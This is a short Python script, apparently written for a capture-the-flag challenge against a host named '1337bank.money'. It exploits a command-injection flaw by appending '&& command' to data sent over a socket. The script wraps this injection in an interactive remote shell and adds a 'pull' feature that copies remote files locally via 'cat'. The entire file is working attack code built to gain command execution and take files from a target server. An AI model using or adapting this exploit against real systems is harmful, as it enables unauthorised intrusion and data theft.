
import time
import socket
import re
import os.path

currDir = "/"
host = "1337bank.money" # IP address here
port = 1337 # Port here


def execute_cmd(cmd):

    global currDir
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    data = s.recv(1024)

    if currDir.split()[0] == "cd":
        s.send(host + " && " + currDir + cmd + "\n")
    else:
        s.send(host + " && " + cmd + "\n")

    if cmd.split()[0] == "cd":
        currDir = cmd + "&&"

    data = s.recv(1024)
    data2 = s.recv(1024)
    print(data2)
    return data2

if __name__ == '__main__':
    command = ""

    exit_cmd = False
    while not exit_cmd:
        command = raw_input(">")
        if command == "shell":
            while command != "quit":
                command = raw_input(currDir + ">")
                execute_cmd(command)
                
        elif command == "quit":
            exit_cmd = True;
            continue

        elif command.split()[0] == "pull":
            str = execute_cmd("cat " + command.split()[1])
            local_path = command.split()[2] + "/result.txt"
            file1 = open("result.txt", "w")
            file1.write(str)
            file1.close()

            os.rename("result.txt", local_path)

        elif command == "help":
            print("shell Drop into an interactive shell and allow users to gracefully exit")
            print("pull <remote-path> <local-path> Download files")
            print("help Shows this help menu")
            print("quit Quit the shell")    
        else:
            print("Command not Supported. Type Help to see supported commands")
